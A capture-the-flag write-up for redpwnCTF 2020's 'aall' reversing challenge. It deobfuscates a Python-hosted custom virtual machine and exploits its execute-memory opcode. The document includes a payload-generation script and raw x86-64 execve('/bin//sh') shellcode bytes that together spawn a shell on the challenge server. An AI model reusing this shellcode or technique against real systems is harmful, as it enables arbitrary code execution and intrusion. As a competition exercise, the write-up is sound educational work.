+++
title = "redpwnCTF - aall"
date = 2020-06-25
aliases = ["/posts/5ef4d50d1d3e7302fc8a3418-redpwnctf-aall"]
[taxonomies]
tags = ["redpwnctf20", "reversing", "python"]
categories = ["ctf-writeups"]
+++

# Challenge

> how many layers of vm are you on
>
> like,, maybe 5, or 6 right now my dude
>
> you are like a baby... watch this
>
> nc 2020.redpwnc.tf 31755

We're also given a [python file](https://gist.github.com/srikavin/f6fc3f9cf62155b95868bac16a40ba5a#file-aall-py) and a 
[Dockerfile](https://gist.github.com/srikavin/f6fc3f9cf62155b95868bac16a40ba5a#file-dockerfile).

# Decoding

Looking at the python file shows that it writes out a file named `breakout.aallo` and calls `exec` on a string after 
base64-decoding and lzma-uncompressing it. We can modify the file to save the executed file to disk instead. 
It's a [python script](https://gist.github.com/srikavin/0cba74ad88e43442154dd341979c9b6d), but all of the variables are 
random unicode characters. Although the python interpreter is happy to run the code, it's nearly impossible to understand. 

<!-- more -->

I wrote a small script to replace all of the unicode characters with a different name:

```python
final = b''
mapping = dict()
counter = 0

for c in decompressed:
    if c >= 128:
        if not c in mapping:
            mapping[c] = 'v' + str(counter)
            counter += 1
        final += mapping[c].encode()
    else:
        final += bytes([c])

open('unpacked1.py', 'wb').write(final)
```

This results in a [slightly easier to read file](https://gist.github.com/srikavin/d495f27076450822e0fc4f6cd4dbc62c):

I went ahead and renamed all of the variables and cleaned up the file. The [resulting file](https://gist.github.com/srikavin/cce2544f70b8283309ac088d274b3b06) 
was clearly an interpreter. An interpreted program is passed through argv, which is then loaded into interpreter memory 
(an array). The first two bytes of the program contain the address to start interpreting at.

The interpreter isn't too complicated, but it has an interesting instruction `%`:

```python
elif instr_type == '%':
    idd = id(memory[registers['ip']:]) + 48
    mmapped = mmap.mmap(-1, mmap.PAGESIZE, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
    c_functype = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int)
    v3v17v25v21 = ctypes.c_void_p.from_buffer(mmapped)
    function = c_functype(ctypes.addressof(v3v17v25v21))
    v3v19v57v10 = bytes(memory[registers['ip']:]).replace(b'\x00', b'')
    mmapped.write(v3v19v57v10)
    retVal = function(idd)
    del v3v17v25v21
    mmapped.close()
```

This instruction mmaps a new block of memory, loads the memory following the instruction pointer's current position, 
and executes it. This means if we somehow insert shellcode into memory, we can execute by using this opcode.

## breakout.aall

We also have the file `breakout.aall` which is the program interpreted by this interpreter. I wrote a script to print 
[a disassembly](https://gist.github.com/srikavin/8c49d2d8c90d9f09aa6e6b5ed771c803) of this file. This program, when 
executed by the interpreter (which is executed by the python interpreter), loads the string 
`https://aaronesau.com/files/objectively-wrong.png` into memory, and then accepts user input.

`breakout.aall` acts as an interpreter itself. It has five instructions:
* `>` which increments the stack pointer
* `<` which decrements the stack pointer
* `+` which increments the value at the stack pointer (dereferences the stack pointer and increments the value)
* `-` which decrements the value at the stack pointer
* `?` which acts as a NOP

We can use `breakout.aall` to write values to memory. Since, the opcodes for `breakout.aall` is also stored in memory, 
we can modify the executed opcodes to include a `%` instruction to execute shellcode. 

The approach is clear: write shellcode to memory, then overwrite parts of `breakout.aal` in memory to jump to the shellcode.

# Payload Generation

Conveniently, `breakout.aall` has a NOP instruction that we can overwrite to `%` to call shellcode. I wrote a script to 
generate the payload:

```python
sp = 1469


def move_sp_to(goal):
    global sp

    old_sp = sp
    sp = goal

    if goal == old_sp:
        return ''
    if goal > old_sp:
        return '>' * (goal - old_sp)
    if goal < old_sp:
        return '<' * (old_sp - goal)


def write_val(index, value, initial_value=0):
    global sp

    ret = move_sp_to(index)

    if value == initial_value:
        return ret
    if value > initial_value:
        return ret + '+' * (value - initial_value)
    if value < initial_value:
        return ret + '-' * (initial_value - value)


payload = ""

previous = b'\x01\x00\x8a\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00https://aaronesau.com/files/ob'
shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
print(shellcode)
# % INSTR AT 1398
payload += write_val(1398, 0x25, 0x5)

# write payload
i = 0
for b in shellcode:
    payload += write_val(1400 + i, b, previous[i])
    i += 1

# trigger shellcode
payload += "?"

print(payload)
```

Since we can only increment and decrement the values at certain locations, I included the values at the memory location before running the script, so that those addresses could be incremented/decremented appropriately.

Piping the output from this script into the program gives us a shell, and we can get the flag:
`flag{b1ng0!_obl1g4t0ry-sh1tty-cust0m_4rch_ch4l-ftw}`.

